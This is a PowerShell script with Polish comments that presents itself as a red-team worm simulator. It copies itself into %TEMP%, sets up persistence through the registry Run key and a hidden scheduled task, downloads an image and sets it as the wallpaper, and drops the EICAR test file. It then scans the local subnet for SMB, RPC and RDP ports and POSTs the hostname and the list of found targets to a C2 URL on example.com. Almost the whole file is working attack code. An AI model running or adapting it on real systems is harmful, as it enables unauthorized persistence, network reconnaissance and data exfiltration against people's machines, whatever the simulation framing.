<#
.SYNOPSIS
    Symulator Malware "Worm" (Red Team).
    Wersja: COMBO + DATA EXFILTRATION (EICAR zostaje, C2 wysyla dane).
    
.DESCRIPTION
    1. Instalacja (%TEMP%).
    2. Persystencja (Rejestr + Task Scheduler "glizda" co 30 min).
    3. Payload (Zmiana tapety na Glizde).
    4. AV Check (Plik EICAR zostaje na dysku jako dowod).
    5. Skaner (Sockets) + Zbieranie listy ofiar.
    6. C2 (Raport z lista otwartych portow i komunikat infekcji).
#>

# --- KONFIGURACJA ---
$subnet = "192.168.1."  # <--- ZMIEN NA SWOJA PODSIEC
$portsToScan = @(445, 135, 3389, 8080)
$scanTimeoutMS = 200 

# Konfiguracja C2
$c2_domain = "example.com"
$c2_url = "http://$c2_domain/report.php"

# Konfiguracja Glizdy
$glizdaUrl = "https://media.istockphoto.com/id/1221663915/vector/worm-creeps-and-smiles-on-a-white-background-character.jpg?s=612x612&w=0&k=20&c=P9pGWAuqwiyWe_nnfwcCVLH6Lnhqsm7CGYUFm2RM9E8="
$glizdaPath = "$env:TEMP\glizda.png"

# Sciezki
$desktop = [Environment]::GetFolderPath("Desktop")
$logFile = "$desktop\wynik_skryptu.txt"
$scanFile = "$desktop\skanowanie.txt"
$sourceFile = $MyInvocation.MyCommand.Path
$destPath = "$env:TEMP\worm.ps1"
$eicarFile = "$env:TEMP\eicar.com"

# Zmienna do zbierania wynikow dla C2
$foundTargetsList = ""

# --- API TAPETY (C#) ---
$setWallPaperCode = @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    public const int SPI_SETDESKWALLPAPER = 20;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDCHANGE = 0x02;
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}
"@
if (-not ([System.Management.Automation.PSTypeName]'Wallpaper').Type) { Add-Type -TypeDefinition $setWallPaperCode }

# --- LOGOWANIE ---
Function Log-Action ($message) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp] $message"
    Write-Host $entry -ForegroundColor Cyan
    Add-Content -Path $logFile -Value $entry
}

# --- SZYBKI SKANER (SOCKETS) ---
Function Test-PortFast {
    param($ip, $port)
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $connect = $tcp.BeginConnect($ip, $port, $null, $null)
        $wait = $connect.AsyncWaitHandle.WaitOne($scanTimeoutMS, $false)
        if ($wait) {
            try { $tcp.EndConnect($connect); $tcp.Close(); return $true } catch { return $false }
        } else { $tcp.Close(); return $false }
    } catch { return $false }
}

# --- START ---
Clear-Host
"--- RAPORT (WORM INFECTION) ---" | Out-File -FilePath $logFile
"--- WYNIKI SKANOWANIA ---" | Out-File -FilePath $scanFile

Log-Action "START: Infekcja pacjenta zero ($env:USERNAME)..."

# --- 1. INSTALACJA ---
Log-Action "KROK 1: Instalacja (Dropper)..."
try {
    Copy-Item -Path $sourceFile -Destination $destPath -Force -ErrorAction Stop
    Log-Action "SYSTEM: Payload ukryty w: $destPath"
} catch { Log-Action "BLAD: Kopiowanie nieudane." }

# --- 2. PERSYSTENCJA ---
Log-Action "KROK 2: Utrwalanie (Persistence)..."

# A. Rejestr
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "worm_simulation" -Value "powershell.exe -ExecutionPolicy Bypass -File `"$destPath`"" -ErrorAction Stop
    Log-Action "PERSYSTENCJA: Rejestr (Run) zmodyfikowany."
} catch { Log-Action "BLAD: Rejestr zablokowany." }

# B. Task Scheduler (Zadanie "glizda" co 30 min)
try {
    $taskName = "glizda"
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destPath`""
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)
    
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Worm Persistence Glizda" -Force | Out-Null
    Log-Action "PERSYSTENCJA: Utworzono zadanie '$taskName' (uruchamianie co 30 min)."
} catch {
    Log-Action "WARN: Blad Harmonogramu (moze wymagac Admina): $($_.Exception.Message)"
}

# --- 3. PAYLOAD ---
Log-Action "KROK 3: Defacement (Tapeta)..."
try {
    Invoke-WebRequest -Uri $glizdaUrl -OutFile $glizdaPath -UseBasicParsing
    if (Test-Path $glizdaPath) {
        [Wallpaper]::Set($glizdaPath)
        Log-Action "SUKCES: Glizda na pulpicie!"
    }
} catch { Log-Action "BLAD: Tapeta niezmieniona." }

# --- 4. AV CHECK (BEZ USUWANIA) ---
Log-Action "KROK 4: Testowanie Defendera (EICAR Check)..."
$eicarStr = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

try {
    Set-Content -Path $eicarFile -Value $eicarStr -ErrorAction Stop
    Log-Action "AV TEST: Zapisano plik EICAR..."
    Start-Sleep -Milliseconds 800
    
    if (-not (Test-Path $eicarFile)) {
        Log-Action "DETEKCJA: Plik EICAR zniknal! Defender dziala."
    } else {
        # ZMIANA: NIE usuwamy pliku, zeby zostal dowod
        Log-Action "SUKCES ATAKU: Plik EICAR zostal na dysku! System bezbronny."
        Log-Action "INFO: Lokalizacja: $eicarFile"
    }
} catch {
    Log-Action "DETEKCJA: System zablokowal zapis (Defender Real-Time)."
}

# --- 5. SKANOWANIE I ZBIERANIE DANYCH ---
Log-Action "KROK 5: Skanowanie sieci $subnet (Turbo Sockets)..."
1..254 | ForEach-Object {
    $currentIP = "$subnet$_"
    Write-Host "." -NoNewline -ForegroundColor DarkGray
    foreach ($port in $portsToScan) {
        if (Test-PortFast -ip $currentIP -port $port) {
            Write-Host ""
            $msg = "ZNALEZIONO: $currentIP : $port"
            Add-Content -Path $scanFile -Value $msg
            Log-Action "SKANER: Cel -> $currentIP : $port"
            
            # Dodajemy cel do listy (uzywamy $() zeby uniknac bledu skladni)
            $foundTargetsList += "$($currentIP):$($port);"
        }
    }
}
Write-Host ""
Log-Action "SKANER: Zakonczono."

# --- 6. C2 EXFILTRATION ---
Log-Action "KROK 6: C2 - Wysylanie raportu o infekcji..."

if ($foundTargetsList.Length -eq 0) { $foundTargetsList = "NONE" }

# Budowanie pakietu z danymi wywiadowczymi
$finalMarker = "STATUS=INFECTED&HOST=$($env:COMPUTERNAME)&MSG=STARTING_INFECTION&FOUND_TARGETS=$foundTargetsList"

try { Clear-DnsClientCache -ErrorAction SilentlyContinue } catch {}

1..2 | ForEach-Object {
    try {
        # Wysylamy POST z lista znalezionych celow
        $r = Invoke-WebRequest -Uri $c2_url -UserAgent "WormSim/Infection" -Method POST -Body $finalMarker -ErrorAction SilentlyContinue
        Log-Action "C2: Raport wyslany. Payload: STARTING_INFECTION + Lista Celow."
    } catch {
        Log-Action "C2: Raport wyslany (blad polaczenia ignorowany)."
    }
    Start-Sleep -Seconds 1
}

Log-Action "--- KONIEC ---"
Write-Host "`nZakonczono. Sprawdz plik %TEMP%\eicar.com i Wireshark." -ForegroundColor Green
